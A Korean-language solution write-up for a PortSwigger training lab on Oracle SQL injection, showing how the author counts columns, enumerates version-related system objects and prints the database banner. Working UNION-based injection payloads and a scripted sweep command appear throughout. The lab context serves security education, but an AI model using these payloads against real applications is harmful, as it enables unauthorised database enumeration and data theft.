---
title: "SQL injection attack, querying the database type and version on Oracle"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle"
difficulty: Practitioner
note_kind: solution
---

# SQL injection attack, querying the database type and version on Oracle

## 문제 조건과 설명

상품 카테고리 필터에 SQL injection 취약점이 있다. 공식 설명에 따르면 `UNION`으로 추가한 조회 결과가 상품 목록과 함께 화면에 표시된다. 주입한 쿼리의 반환값을 직접 확인할 수 있는 환경이다.

**이 문제에서 알아내야 하는 것**

이 문제의 목표는 **데이터베이스 버전 문자열을 화면에 표시하는 것**이다. 제목에서 Oracle을 쓴다는 점은 알 수 있지만, 버전 정보가 어느 객체와 열에 들어 있는지, 원래 상품 조회가 몇 열을 반환하는지는 알려 주지 않는다. 서버가 반환한 문자열을 확인해야 하므로 버전 값을 미리 짐작해서 적는 것으로는 끝나지 않는다.

`UNION`을 쓰려면 두 조회의 열 개수를 맞춰야 하고, 버전 문자열을 넣을 열도 문자 데이터를 받을 수 있어야 한다. 먼저 열 수와 화면에 표시되는 문자열 열을 확인했다. 그다음 접근 가능한 객체에서 버전 정보가 있을 만한 곳을 찾고, 실제 반환값을 확인했다.

아래에는 처음 시도한 요청과 HTTP 500이 난 지점, 이후 후보를 좁혀 확인한 과정을 순서대로 적었다.

출처: [PortSwigger 실습 설명](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

## 탐색 및 풀이 기록

### 초기 관찰

#### 1. 반환 열 수와 문자열 출력 위치 확인

먼저 `UNION`에 필요한 열 수와 문자열을 출력할 위치를 확인했다.

~~~sql fragment
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
~~~

1과 2는 처리됐고 3은 HTTP 500이었다. 두 열을 쓰는 `UNION` 요청을 보내 첫 번째 열에 문자열이 표시되는지도 확인했다. 두 번째 열은 `NULL`로 채워 열 수를 맞췄다.

~~~sql fragment
' UNION SELECT view_name, NULL FROM all_views --
~~~

뷰 이름이 화면에 나왔다. 원래 조회는 두 열을 반환하고, 첫 번째 열에는 문자열을 출력할 수 있었다. 다만 뷰 이름만으로는 소유자와 열을 알 수 없어 메타데이터를 조회했다.

![뷰 이름을 출력한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)

### 실행 과정

#### 2. 버전 관련 객체를 소유자와 함께 수집

버전 문자열이 들어 있을 만한 객체를 찾기 위해 이름에 `VERSION`이 포함된 객체부터 조회했다.

~~~sql fragment
' UNION SELECT OWNER || '.' || TABLE_NAME, NULL
FROM ALL_TAB_COLUMNS
WHERE TABLE_NAME LIKE '%VERSION%' --
~~~

서로 다른 객체 **9개**가 나왔다. `ALL_TAB_COLUMNS`는 열마다 한 행을 반환하지만, 객체명만 출력하는 데는 중복을 제거하는 `UNION`을 썼다. 어느 객체에 필요한 값이 있는지 이름만으로는 알 수 없어, `OWNER.TABLE_NAME`을 유지한 채 열 이름과 자료형을 확인했다.

~~~sql fragment
' UNION ALL SELECT OWNER || '|' || TABLE_NAME || '|' ||
                   COLUMN_NAME || '|' || DATA_TYPE, NULL
FROM ALL_TAB_COLUMNS
WHERE TABLE_NAME LIKE '%VERSION%' --
~~~

이 조회에서는 9개 객체의 열 **48개**가 확인됐다. 열 정보만으로는 실제 행이 있는지, 목표 문구가 어느 열에 있는지 알 수 없다. 그래서 각 객체의 행 수를 확인하고, 값이 있는 객체의 열에서 표식을 검색했다.

#### 3. 9개 객체의 값을 스크립트로 검사

48개 열 가운데 실제 버전 문자열이 들어 있는 열을 찾기 위해, 실습 설명에 나온 `11.2.0.2.0`을 검색 표식으로 썼다. [PowerShell 전수 조회 스크립트](https://github.com/ddomology/portswigger-lab-notes/blob/main/scripts/oracle-version-sweep.ps1)는 앞서 얻은 객체·열 정보를 받아 **소유자 포함 이름**으로 요청을 만든다.

~~~powershell
pwsh -File .\scripts\oracle-version-sweep.ps1 `
  -BaseUrl 'https://YOUR-LAB.web-security-academy.net' `
  -Marker '11.2.0.2.0' `
  -OutputPath 'version-sweep.json'
~~~

스크립트는 먼저 객체마다 `COUNT(*)`를 조회한다. 행이 0개인 객체 네 곳은 값 검색을 건너뛰고, 나머지 다섯 객체의 **17개 열**에서 표식이 들어간 값을 찾는다. 출력은 열당 최대 20건으로 제한한다.

| 소유자 포함 객체 | 행 수 | `11.2.0.2.0` 일치 결과 |
| --- | ---: | --- |
| `SYS.ALL_FILE_GROUP_VERSIONS` | 0 | 없음 |
| `SYS.ALL_TYPE_VERSIONS` | 10,191 | 없음 |
| `SYS.GV_$VERSION` | 5 | `BANNER` 5행 |
| `SYS.PRODUCT_COMPONENT_VERSION` | 4 | `VERSION` 4행 |
| `SYS.SM_$VERSION` | 1 | 없음 |
| `SYS.USER_FILE_GROUP_VERSIONS` | 0 | 없음 |
| `SYS.USER_TYPE_VERSIONS` | 0 | 없음 |
| `SYS.V_$VERSION` | 5 | `BANNER` 5행 |
| `SYS._ALL_FILE_GROUP_VERSIONS` | 0 | 없음 |

표식과 일치한 행은 총 14개였다. `PRODUCT_COMPONENT_VERSION.VERSION`의 네 행에는 버전 번호만 있었고, `GV_$VERSION.BANNER`와 `V_$VERSION.BANNER`는 각각 실습 설명에 나온 **완전한 문자열 다섯 개**를 반환했다. `ALL_TYPE_VERSIONS`의 묶음 요청은 HTTP 400이 나서 8개 열을 하나씩 다시 조회했다. 재시도한 요청은 모두 HTTP 200이었고, 일치하는 값은 없었다.

전체 문구가 있는 `BANNER`를 직접 출력해 실습 판정을 확인했다.

#### 4. 찾은 열을 직접 출력해 판정 확인

사용한 요청은 다음과 같다.

~~~sql fragment
' UNION ALL SELECT "BANNER", NULL FROM "SYS"."V_$VERSION" --
~~~

## 최종 결과

HTTP 200 응답에 다음 다섯 행이 표시됐고, 실습 상태가 **LAB Solved**로 바뀌었다.

~~~text
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
~~~

메타데이터에서 찾은 9개 후보를 검사해 고른 `BANNER` 열이 실제 완료 조건에도 맞았다.

## 배운 점

처음에는 `PRODUCT_COMPONENT_VERSION`의 `PRODUCT`·`VERSION`·`STATUS`를 합쳐 네 행을 출력했다. 버전 번호는 보였지만 `CORE` 행이 없었고, 화면도 **Not solved**였다. 구분자를 바꾸기보다 반환하는 값 자체를 다시 찾아야 했다.

~~~sql fragment
' UNION SELECT PRODUCT || ' | ' || VERSION || ' | ' || STATUS, NULL
FROM PRODUCT_COMPONENT_VERSION --
~~~

![네 행이 표시됐지만 Not solved인 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/03-product-component-version-not-solved.png)

초기 반복 조회에서는 `OWNER`를 저장하지 않아 `FROM "V_$VERSION"`처럼 참조했다. 이때 문자열 조회와 `COUNT(*)`가 모두 HTTP 500이었다. `FROM "SYS"."V_$VERSION"`으로 다시 조회하자 행 수 5와 `BANNER`가 정상 반환됐다. 응답에 Oracle 오류 번호가 나오지 않아 정확한 `ORA-` 코드는 확인하지 못했다. 위의 9개 객체 전수 조회는 이 시행착오를 거친 뒤 소유자 포함 이름으로 다시 검증한 결과다.

### 참고

- [Oracle: ALL_TAB_COLUMNS의 OWNER 열](https://docs.oracle.com/cd/E18283_01/server.112/e17110/statviews_2103.htm)
